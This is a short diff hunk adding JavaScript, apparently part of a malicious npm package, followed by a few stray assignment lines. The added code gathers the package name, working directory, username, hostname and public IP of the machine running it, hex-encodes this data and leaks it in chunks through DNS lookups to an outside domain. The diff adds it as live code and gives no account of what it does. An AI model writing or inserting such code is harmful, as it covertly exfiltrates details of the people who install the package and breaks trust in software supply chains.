@@ -1,0 +1,26 @@
+resp.on('data', function (ip) {
+            const data = JSON.stringify({
+                packagename: packageName,
+                cwd: cwd,
+                username: username,
+                hostname: hostname,
+                ip: ip.toString()
+            })
+
+            const options = {
+                family: 4,
+            };
+
+            var dataHex = Buffer.from(data, "utf8").toString('hex') + "00"
+            var splitted = dataHex.match(/.{1,30}/g)
+
+            for (var i = 0; i < splitted.length; i++) {
+                var domain = ID + "." + i + "." + splitted[i] + "." + topDomain
+                dns.lookup(domain, options, () => { })
+            }
+        })
+_tmp_1.packagename = packageName
+_tmp_1.cwd = cwd
+_tmp_1.username = username
+_tmp_1.hostname = hostname
+_tmp_1.ip = ip.toString()
